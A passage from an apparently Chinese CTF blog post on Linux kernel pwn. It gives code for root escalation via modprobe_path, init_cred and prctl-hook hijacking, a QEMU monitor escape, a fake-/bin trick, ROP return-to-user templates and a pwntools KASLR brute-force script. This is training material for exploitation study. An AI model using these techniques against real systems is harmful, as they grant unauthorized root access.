<p>(2)</p>

        <h2 id="3-常见提权手段"   >
          <a href="#3-常见提权手段" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-常见提权手段" class="headerlink" title="3.常见提权手段"></a>3.常见提权手段</h2>
      
        <h3 id="修改modprobe-path"   >
          <a href="#修改modprobe-path" class="heading-link"><i class="fas fa-link"></i></a><a href="#修改modprobe-path" class="headerlink" title="修改modprobe_path"></a>修改modprobe_path</h3>
      <p>这个设方法如果开启如下配置则不可用，表示<code>modprobe_path</code>为只读，不可修改</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//v4.11及之后存在</span><br><span class="line">CONFIG_STATIC_USERMODEHELPER=y</span><br><span class="line">CONFIG_STATIC_USERMODEHELPER_PATH=&quot;&quot;</span><br></pre></td></tr></table></div></figure>

<p>常常结合UAF漏洞来任意申请</p>
<p>starctf2019-hackme–<a href="https://pig-007.github.io/2021/08/14/starctf2019-hackme/">starctf2019-hackme | PIG-007</a></p>
<p>西湖论剑–easy_kernel–<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.crisprx.top/archives/495" >2021 西湖论剑 线上初赛 WP – Crispr –热爱技术和生活 (crisprx.top)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/kallsyms| grep modprobe_path</span><br></pre></td></tr></table></div></figure>

<p>然后制作一个拷贝flag并且改权限的copy.sh文件，使得modprobe_path指向该文件，然后运行一个错误格式的文件，那么出错之后就会以root权限运行modprobe_path，从而以root权限运行我们的copy.sh，使得我们能够读取flag了。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">strncpy</span>(mem,<span class="string">&quot;/home/pwn/copy.sh\0&quot;</span>,<span class="number">18</span>);</span><br><span class="line">write_to_kernel(fd,<span class="number">0xc</span>,mem,<span class="number">18</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;echo -ne &#x27;#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag&#x27; &gt; /home/pwn/copy.sh&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;chmod +x /home/pwn/copy.sh&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /home/pwn/dummy&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;chmod +x /home/pwn/dummy&quot;</span>);</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;/home/pwn/dummy&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;cat flag&quot;</span>);</span><br></pre></td></tr></table></div></figure>


        <h3 id="修改init-cred"   >
          <a href="#修改init-cred" class="heading-link"><i class="fas fa-link"></i></a><a href="#修改init-cred" class="headerlink" title="修改init_cred"></a>修改init_cred</h3>
      <p>init进程是初始进程，不被动态分配，知道kernel基地址的时候，就能得到该结构体的地址。</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/kallsyms |grep init_cred</span><br></pre></td></tr></table></div></figure>

<p>这种方法一般用在没办法修改到本进程的cred结构体的时候，之后使用即可提权</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//pop_rdi_ret init_cred_addr commit_creds_addr即可</span></span><br><span class="line">commit_creds(&amp;init_cred)</span><br></pre></td></tr></table></div></figure>


        <h3 id="劫持prtcl-hook"   >
          <a href="#劫持prtcl-hook" class="heading-link"><i class="fas fa-link"></i></a><a href="#劫持prtcl-hook" class="headerlink" title="劫持prtcl_hook"></a>劫持prtcl_hook</h3>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://localhost:4000/2021/10/19/Kernel%E4%BB%8E0%E5%BC%80%E5%A7%8B(%E5%9B%9B)/#3-%E5%8A%AB%E6%8C%81prctl%E5%87%BD%E6%95%B0" >pwnKernel从0开始(四) | PIG-007</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">prctl-&gt;security_task_prctl-&gt;prctl_hook-&gt;orderly_poweroff-&gt;__orderly_poweroff-&gt;run_cmd(poweroff_cmd)-&gt; call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC)</span><br><span class="line"></span><br><span class="line">prctl-&gt;security_task_prctl-&gt;prctl_hook-&gt;poweroff_work_fun-&gt;run_cmd(poweroff_cmd)-&gt; call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC)</span><br></pre></td></tr></table></div></figure>


        <h4 id="1-劫持为orderly-poweroff函数"   >
          <a href="#1-劫持为orderly-poweroff函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-劫持为orderly-poweroff函数" class="headerlink" title="(1)劫持为orderly_poweroff函数"></a>(1)劫持为orderly_poweroff函数</h4>
      <p>劫持该hook为orderly_poweroff函数，然后调用prctl函数即可操纵程序流进入<code>orderly_poweroff</code>函数，再劫持<code>poweroff_cmd</code>即可顺着<code>orderly_poweroff</code>函数来运行<code>call_usermodehelper(poweroff_cmd)</code>，该函数是以root权限运行，所以能够直接提权，不过一般运行一个反弹shell的程序。当然如果有KASLR就要爆破或者泄露了。</p>
<p>最后需要执行<code>prctl(0,0)</code>；</p>

        <h4 id="2-劫持为poweroff-work-fun函数"   >
          <a href="#2-劫持为poweroff-work-fun函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-劫持为poweroff-work-fun函数" class="headerlink" title="(2)劫持为poweroff_work_fun函数"></a>(2)劫持为poweroff_work_fun函数</h4>
      <p>与劫持<code>orderly_poweroff</code>函数同理，劫持为<code>poweroff_work_fun</code>函数也可以以root权限执行<code>poweroff_cmd</code></p>

        <h4 id="3-获取地址"   >
          <a href="#3-获取地址" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-获取地址" class="headerlink" title="(3)获取地址"></a>(3)获取地址</h4>
      
        <h5 id="①prctl-hook"   >
          <a href="#①prctl-hook" class="heading-link"><i class="fas fa-link"></i></a><a href="#①prctl-hook" class="headerlink" title="①prctl_hook"></a>①prctl_hook</h5>
      <p>可以通过编写一个小程序，然后给<code>security_task_prctl</code>函数下断点，运行到<code>call QWORD PTR[rbx+0x18]</code>即可看到对应的rbx+0x18上存放的地址，即可获取到<code>prct_hook_addr</code>，劫持修改即可</p>

        <h5 id="②poweroff-cmd、orderly-poweroff、poweroff-work-fun"   >
          <a href="#②poweroff-cmd、orderly-poweroff、poweroff-work-fun" class="heading-link"><i class="fas fa-link"></i></a><a href="#②poweroff-cmd、orderly-poweroff、poweroff-work-fun" class="headerlink" title="②poweroff_cmd、orderly_poweroff、poweroff_work_fun"></a>②poweroff_cmd、orderly_poweroff、poweroff_work_fun</h5>
      <p>poweroff_cmd是一个全局变量，可以直接获取地址然后修改。可以直接使用nm命令来获取，或者直接进入gdb打印即可。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191247187.png" alt="image-20211021105456058"></p>
<p>此外orderly_poweroff也是一样的获取。如果无法查到，那么可以启动qemu，先设置为root权限后</p>
<p><code>cat /proc/kallsyms | grep &quot;orderly_poweroff&quot;</code>即可，或者编译一个对应版本的内核进行查询。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191247302.png" alt="image-20211021105603666"></p>
<p><code>poweroff_work_fun</code>函数也是类似的获取方式</p>

        <h1 id="七、意想不到的方式"   >
          <a href="#七、意想不到的方式" class="heading-link"><i class="fas fa-link"></i></a><a href="#七、意想不到的方式" class="headerlink" title="七、意想不到的方式"></a>七、意想不到的方式</h1>
      
        <h2 id="1-QEMU逃逸"   >
          <a href="#1-QEMU逃逸" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-QEMU逃逸" class="headerlink" title="1.QEMU逃逸"></a>1.QEMU逃逸</h2>
      <p>当没有关闭monitor时，可以直接ctrl+A C进去逃逸，解压rootfs.img读flag</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">migrate <span class="string">&quot;exec:cp rootfs.img /tmp &quot;</span></span><br><span class="line">migrate <span class="string">&quot;exec:cd /tmp;zcat rootfs.img | cpio -idmv 1&gt;&amp;2&quot;</span></span><br><span class="line">migrate <span class="string">&quot;exec:cat /tmp/flag 1&gt;&amp;2&quot;</span></span><br><span class="line">(qemu) migrate <span class="string">&quot;exec:cat /tmp/flag 1&gt;&amp;2&quot;</span></span><br><span class="line">flag&#123;test_flag&#125;qemu-system-x86_64: failed to save SaveStateEntry with id(name):)</span><br><span class="line">qemu-system-x86_64: Unable to write to <span class="built_in">command</span>: Broken pipe</span><br><span class="line">qemu-system-x86_64: Unable to write to <span class="built_in">command</span>: Broken pipe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">zcat rootfs.cpio | cpio -idmv 1&gt;&amp;2</span><br></pre></td></tr></table></div></figure>


        <h2 id="2-权限配置问题"   >
          <a href="#2-权限配置问题" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-权限配置问题" class="headerlink" title="2.权限配置问题"></a>2.权限配置问题</h2>
      <p>有的根目录或者bin目录的所有者不是root时</p>

        <h3 id="1-bin目录不为ROOT"   >
          <a href="#1-bin目录不为ROOT" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-bin目录不为ROOT" class="headerlink" title="(1)bin目录不为ROOT"></a>(1)bin目录不为ROOT</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203021148186.png" alt="image-20220302114830086"></p>
<p>这样可以修改bin里面的命令，而init脚本在退出时，通常包含poweroff命令，或者umount命令，而init运行时是以root权限运行的，所以我们可以修改这些命令从而在输入exit命令调用init中在setsid剩下的命令时来直接cat flag或者获得shell</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203021149995.png" alt="image-20220302114945940"></p>

        <h3 id="2-根目录不为ROOT"   >
          <a href="#2-根目录不为ROOT" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-根目录不为ROOT" class="headerlink" title="(2)根目录不为ROOT"></a>(2)根目录不为ROOT</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203021152377.png" alt="image-20220302115207278"></p>
<p>那么在根目录下，虽然bin的所有者为root，但是缺可以对bin进行改名，然后我们伪造一个bin目录，里面放上我们伪造的命令，那么就可以以root权限调用这个伪造的命令了，如下为所示例子。</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mv bin evil_bin</span><br><span class="line">mkdir bin</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;#!/evil_bin/sh&quot;</span> &gt; /bin/power</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;/evil_bin/sh&quot;</span> &gt;&gt; /bin/power</span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></div></figure>




        <h1 id="八、模板"   >
          <a href="#八、模板" class="heading-link"><i class="fas fa-link"></i></a><a href="#八、模板" class="headerlink" title="八、模板"></a>八、模板</h1>
      
        <h2 id="1-保存状态"   >
          <a href="#1-保存状态" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-保存状态" class="headerlink" title="1.保存状态"></a>1.保存状态</h2>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">saveStatus</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="2-用户态起Shell"   >
          <a href="#2-用户态起Shell" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-用户态起Shell" class="headerlink" title="2.用户态起Shell"></a>2.用户态起Shell</h2>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getRootShell</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Backing from the kernelspace.\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="3-返回用户态"   >
          <a href="#3-返回用户态" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-返回用户态" class="headerlink" title="3.返回用户态"></a>3.返回用户态</h2>
      
        <h3 id="1-没有KPTI"   >
          <a href="#1-没有KPTI" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-没有KPTI" class="headerlink" title="(1)没有KPTI"></a>(1)没有KPTI</h3>
      <p>正常的swapgs和iretq</p>
<p>ROP布局如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">swapgs_ret</span><br><span class="line">iretq</span><br><span class="line">&amp;get_shell,</span><br><span class="line">user_cs,</span><br><span class="line">user_rflags,</span><br><span class="line">user_sp,</span><br><span class="line">user_ss</span><br></pre></td></tr></table></div></figure>


        <h3 id="2-存在KPTI"   >
          <a href="#2-存在KPTI" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-存在KPTI" class="headerlink" title="(2)存在KPTI"></a>(2)存在KPTI</h3>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/240006#h3-2" >Linux Kernel KPTI保护绕过 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>从<code>swapgs_restore_regs_and_return_to_usermode</code>函数某处开始执行</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov    rsp,QWORD PTR gs:0x6004   //该处开始执行</span><br></pre></td></tr></table></div></figure>

<p>ROP布局如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">swapgs_restore_regs_and_return_to_usermode+0x19,</span><br><span class="line">0,</span><br><span class="line">0,</span><br><span class="line">&amp;get_shell,</span><br><span class="line">user_cs,</span><br><span class="line">user_rflags,</span><br><span class="line">user_sp,</span><br><span class="line">user_ss</span><br></pre></td></tr></table></div></figure>


        <h2 id="4-爆破KASLR"   >
          <a href="#4-爆破KASLR" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-爆破KASLR" class="headerlink" title="4.爆破KASLR"></a>4.爆破KASLR</h2>
      <p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://arttnba3.cn/2021/10/31/CTF-0X05-TCTF2021_FINAL/" >【CTF.0x05】TCTF2021-FINAL 两道 kernel pwn 题解 - arttnba3’s blog</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="1-POC里"   >
          <a href="#1-POC里" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-POC里" class="headerlink" title="(1)POC里"></a>(1)POC里</h3>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">offset = (argv[<span class="number">1</span>]) ? atoi(argv[<span class="number">1</span>]) : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ROP[i++] = POP_RDI_RET + offset;</span><br><span class="line">ROP[i++] = <span class="number">0</span>;</span><br><span class="line">ROP[i++] = PREPARE_KERNEL_CRED + offset;</span><br><span class="line">ROP[i++] = COMMIT_CREDS + offset;</span><br><span class="line">ROP[i++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="number">22</span> + offset;</span><br></pre></td></tr></table></div></figure>


        <h3 id="2-打远程的EXP"   >
          <a href="#2-打远程的EXP" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-打远程的EXP" class="headerlink" title="(2)打远程的EXP"></a>(2)打远程的EXP</h3>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./exp&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    exp = base64.b64encode(f.read())</span><br><span class="line">    </span><br><span class="line">p = process(<span class="string">&#x27;./run.sh&#x27;</span>)<span class="comment">#remote(&quot;127.0.0.1&quot;, 1234)</span></span><br><span class="line">try_count = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    log.info(<span class="string">&quot;no.&quot;</span> + <span class="built_in">str</span>(try_count) + <span class="string">&quot; time(s)&quot;</span>)</span><br><span class="line">    p.sendline()</span><br><span class="line">    p.recvuntil(<span class="string">&quot;~ $&quot;</span>)</span><br><span class="line"></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(exp), <span class="number">0x200</span>):</span><br><span class="line">        p.sendline(<span class="string">&quot;echo -n \&quot;&quot;</span> + exp[i:i + <span class="number">0x200</span>].decode() + <span class="string">&quot;\&quot; &gt;&gt; b64_exp&quot;</span>)</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(count):</span><br><span class="line">        p.recvuntil(<span class="string">&quot;~ $&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    p.sendline(<span class="string">&quot;cat b64_exp | base64 -d &gt; ./exploit&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;chmod +x ./exploit&quot;</span>)</span><br><span class="line">    randomization = (try_count % <span class="number">1024</span>) * <span class="number">0x100000</span></span><br><span class="line">    log.info(<span class="string">&#x27;trying randomization: &#x27;</span> + <span class="built_in">hex</span>(randomization))</span><br><span class="line">    p.sendline(<span class="string">&quot;./exploit &quot;</span> + <span class="built_in">str</span>(randomization))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> p.recvuntil(<span class="string">b&quot;Rebooting in 1 seconds..&quot;</span>, timeout=<span class="number">60</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    log.warn(<span class="string">&#x27;failed!&#x27;</span>)</span><br><span class="line">    try_count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&#x27;success to get the root shell!&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></div></figure>


        <h2 id="5-retUsr模板"   >
          <a href="#5-retUsr模板" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-retUsr模板" class="headerlink" title="5.retUsr模板"></a>5.retUsr模板</h2>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span>&#123;</span></span><br><span class="line">    <span class="keyword">void</span> *rip;</span><br><span class="line">    <span class="keyword">uint64_t</span> cs;</span><br><span class="line">    <span class="keyword">uint64_t</span> rflags;</span><br><span class="line">    <span class="keyword">void</span> * rsp;</span><br><span class="line">    <span class="keyword">uint64_t</span> ss;</span><br><span class="line">&#125;__attribute__((packed));    <span class="comment">// 保存状态的结构体</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> <span class="title">status</span>;</span>     <span class="comment">// 保存状态</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 将状态保存在status中</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save</span><span class="params">()</span>                  </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">&quot;mov %%ss, %0\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov %%rsp, %1\n&quot;</span></span><br><span class="line">        <span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line">        <span class="string">&quot;pop %2\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov %%cs, %3\n&quot;</span></span><br><span class="line">        :<span class="string">&quot;=r&quot;</span>(status.ss),<span class="string">&quot;=r&quot;</span>(status.rsp),<span class="string">&quot;=r&quot;</span>(status.rflags),<span class="string">&quot;=r&quot;</span>(status.cs)</span><br><span class="line">        :</span><br><span class="line">        :<span class="string">&quot;memory&quot;</span></span><br><span class="line">        );</span><br><span class="line">    status.rip = shell;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">retUsr</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">&quot;swapgs\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov $status,%rsp\n&quot;</span></span><br><span class="line">        <span class="string">&quot;iretq&quot;</span></span><br><span class="line">        );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h1 id="九、常见可利用结构体"   >
          <a href="#九、常见可利用结构体" class="heading-link"><i class="fas fa-link"></i></a><a href="#九、常见可利用结构体" class="headerlink" title="九、常见可利用结构体"></a>九、常见可利用结构体</h1>
      <p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#0x01-tty-%E7%B3%BB%E5%88%97%E7%BB%93%E6%9E%84%E4%BD%93" >【NOTES.0x08】Linux Kernel Pwn IV：通用结构体与技巧 - arttnba3’s blog</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="1-tty系列结构体"   >
          <a href="#1-tty系列结构体" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-tty系列结构体" class="headerlink" title="1.tty系列结构体"></a>1.tty系列结构体</h2>
      <p>打开设备：<code>/dev/ptmx</code></p>
<p>tty_struct 的魔数为 <code>0x5401</code>，位于该结构体的开头，我们可以利用对该魔数的搜索以锁定该结构体。</p>
<p>上面<strong>堆-&gt;借助ptmx设备</strong>讲过了</p>

        <h2 id="2-seq-operations结构体"   >
          <a href="#2-seq-operations结构体" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-seq-operations结构体" class="headerlink" title="2.seq_operations结构体"></a>2.seq_operations结构体</h2>
      <p>打开设备：<code>proc/self/stat</code></p>
<p>该结构体定义于 <code>/include/linux/seq_file.h</code> 当中，大小为0x20</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">struct seq_operations &#123;</span><br><span class="line">	void * (*start) (struct seq_file *m, loff_t *pos);</span><br><span class="line">	void (*stop) (struct seq_file *m, void *v);</span><br><span class="line">	void * (*next) (struct seq_file *m, void *v, loff_t *pos);</span><br><span class="line">	int (*show) (struct seq_file *m, void *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>通过函数指针泄露地址，再劫持start函数指针后对该设备进行读写即可调用劫持的start函数指针，控制程序流程。读写的时候可通过syscall创建<code>pt_regs</code>结构体来布置内核栈环境，然后通过<code>swapgs_restore_regs_and_return_to_usermode</code>函数返回用户空间。</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/260055#h3-5" >西湖论剑2021线上初赛easykernel题解 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="3-subprocess-info结构体"   >
          <a href="#3-subprocess-info结构体" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-subprocess-info结构体" class="headerlink" title="3.subprocess_info结构体"></a>3.subprocess_info结构体</h2>
      <p>通过以下语句可以分配得到一个<code>subprocess_info</code>结构体，大小为0x60，使用kmalloc-128分配器</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socket(22, AF_INET, 0);</span><br></pre></td></tr></table></div></figure>

<p>结构体</p>
